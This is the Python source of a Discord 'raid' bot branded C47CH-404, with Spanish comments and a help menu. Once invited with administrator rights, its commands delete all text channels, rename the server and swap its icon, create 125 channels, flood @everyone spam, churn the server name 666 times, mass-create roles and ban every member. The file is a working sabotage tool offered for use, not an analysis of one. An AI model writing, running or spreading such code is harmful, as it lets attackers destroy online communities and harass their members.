import discord
from discord.ext import commands
import random
import asyncio
import requests
import string
import aiohttp
from discord import File
from discord import Colour

bot = commands.Bot(command_prefix='x$', intents=discord.Intents.all(), help_command=None)

GUILD_NAME = '🏴‍☠️PossessedByTheC47CH-404'  # Nombre del servidor por el que va a ser cambiado
CHANNEL_NAME = "🧨C47CH-404WasHere" # Nombre de los canales que se van a creear
SPAM_MESSAGE = "☠️ [ ||@everyone|| ]\n ➡️ Your Server Has Been Raided By The **C47CH-404**\n ➡️ https://discord.gg/KK4besj8WC https://media1.tenor.com/m/mXibMXSiN1wAAAAd/pirates-pirate.gif" # Mensaje de spam que se va a enviar

@bot.event
async def on_ready():
    print(f'Usuario Conectado Como: {bot.user}')

PREFIX = "x$"
RESTRICTED_SERVER_IDS = ["ID_Here"]  # IDs de los servidores donde no se pueden ejecutar los comandos de ra1d

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.guild is not None and str(message.guild.id) in RESTRICTED_SERVER_IDS:
        if message.content.startswith(f"{PREFIX}help"):
            await bot.process_commands(message)
            return

        if any(message.content.startswith(f"{PREFIX}{cmd}") for cmd in ["nuke", "kill", "audit_log_lock", "create_channels", "create_roles", "ban_all"]):
            await message.delete()
            try:
                await message.channel.send(f"{message.author.mention} You cannot use commands in this server, except for {PREFIX}help.")
            except Exception as e:
                print(f"Error sending message in channel {message.channel}: {e}")
            return

    await bot.process_commands(message)

@bot.command()
async def invite(ctx):
    permissions = discord.Permissions(administrator=True)
    invite_link = discord.utils.oauth_url(ctx.bot.user.id, permissions=permissions)
    await ctx.send(f"> ☠️ Invite Me Here!:\n > ➡️ ||[Click Here!]({invite_link})||")

@bot.command()
async def help(ctx):
    loading_embed = discord.Embed(
        title="Loading Commands...",
        description="> 🏇",
        color=discord.Color(int("6d12d6", 16)),
    )
    loading_message = await ctx.send(embed=loading_embed)

    await asyncio.sleep(3)

    help_embed = discord.Embed(
        title="🌜 Comandos R41d Lunnaris - Rbot",
        description="🌐 Lista de comandos disponibles:",
        color=discord.Color(int("6d12d6", 16)),
    )
    help_embed.set_thumbnail(url="https://cdn.discordapp.com/icons/1298087061013659709/bd06f88c9678ac83014e6dcdb518c5cf.webp?size=512") 
    help_embed.add_field(name="➡️ x$nuke", value="Borra todos los canales de texto.", inline=False)
    help_embed.add_field(name="➡️ x$kill", value="Inicia una ra1d.", inline=False)
    help_embed.add_field(name="➡️ x$audit_log_lock", value="Cambia el nombre del servidor 666 veces.", inline=False)
    help_embed.add_field(name="➡️ x$create_channels", value="Crea 125 canales.", inline=False)
    help_embed.add_field(name="➡️ x$create_roles", value="Crea 70 roles.", inline=False)
    help_embed.add_field(name="➡️ x$ban_all", value="Banea a todos los usuarios por debajo del rol del bot.", inline=False)
    help_embed.set_footer(text="⌗ 🦇 C47CH-404🦇 - Lunnaris Rbot")
    
    await loading_message.edit(embed=help_embed)

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    
    channels = ctx.guild.text_channels
    
    for channel in channels:
        try:
            await channel.delete()  
        except Exception as e:
            print(f"Could not delete channel {channel.name}: {e}")  
    try:
        new_channel = await ctx.guild.create_text_channel("🧨C47CH-404-was-here") 
        await ctx.send(f'New channel created: {new_channel.mention}')
    except Exception as e:
        print(f"Could not create new channel: {e}")  

    try:
        await ctx.guild.edit(name="🏴‍☠️PossessedByTheC47CH-404")  
    except Exception as e:
        print(f"Could not change server name: {e}") 

    logo_url = "https://cdn.discordapp.com/icons/1298087061013659709/bd06f88c9678ac83014e6dcdb518c5cf.webp?size=512"
    
    async with aiohttp.ClientSession() as session: 
        try:
            async with session.get(logo_url) as resp: 
                if resp.status == 200:
                    image_data = await resp.read()
                    await ctx.guild.edit(icon=image_data)  
                else:
                    print(f"Failed to fetch image: {resp.status}")
        except Exception as e:
            print(f"Could not change server icon: {e}")

@bot.command()
async def kill(ctx):
    guild = ctx.guild 

    if guild:
        try:
            await guild.edit(name=GUILD_NAME)
            print(f'Server renamed to: {GUILD_NAME}')

            for channel in guild.channels:
                if isinstance(channel, discord.TextChannel):
                    await channel.delete()
                    print(f'Deleted channel: {channel.name}')
            tasks = []
            for i in range(125):
                channel = await guild.create_text_channel(CHANNEL_NAME)
                print(f'Channel created: {CHANNEL_NAME}')

                tasks.append(spam_messages(channel))

            await asyncio.gather(*tasks)

        except Exception as e:
            print(f'Error during nuke operation: {e}')
            await ctx.send("An error occurred while trying to nuke the server.")

    else:
        await ctx.send("Guild not found. Please check the guild name.")

async def spam_messages(channel):
    """Function to spam messages in a channel."""
    for _ in range(70):
        await channel.send(SPAM_MESSAGE)
        print(f'Message sent in {channel.name}')
        await asyncio.sleep(0.25) 

def generar_nombre_aleatorio():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

@bot.command()
async def audit_log_lock(ctx):
    for _ in range(666):  
        nuevo_nombre = generar_nombre_aleatorio() 
        await ctx.guild.edit(name=nuevo_nombre) 

@bot.command()
async def create_channels(ctx):
            guild = ctx.guild
            tasks = [guild.create_text_channel("🧨C47CH-404-was-here") for _ in range(125)]
            await asyncio.sleep(5)
            created_channels = await asyncio.gather(*tasks)

@bot.command()
async def create_roles(ctx, amount: int = 70, *, name="💣C47CH-404-DOMINION"):
    for i in range(amount):
        try:
            color = Colour(random.randint(0, 0xFFFFFF))
            await ctx.guild.create_role(name=f"{name} {i + 1}", colour=color)
            print(f"Created role: {name} {i + 1} with color: {color}")
        except discord.Forbidden:
            print("I don't have the necessary permissions to create roles")
        except discord.HTTPException as e:
            print(f"An error occurred while creating role: {e}")

@bot.command()
async def ban_all(ctx):
    for m in ctx.guild.members:
        try:
            await m.ban()
            print(f"Banned {m}")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to ban {m}")
        except discord.HTTPException as e:
            print(f"An error occurred while banning {m}: {e}")

bot.run('Token_Here') # Coloca El Token de tu bot dentro de los ''
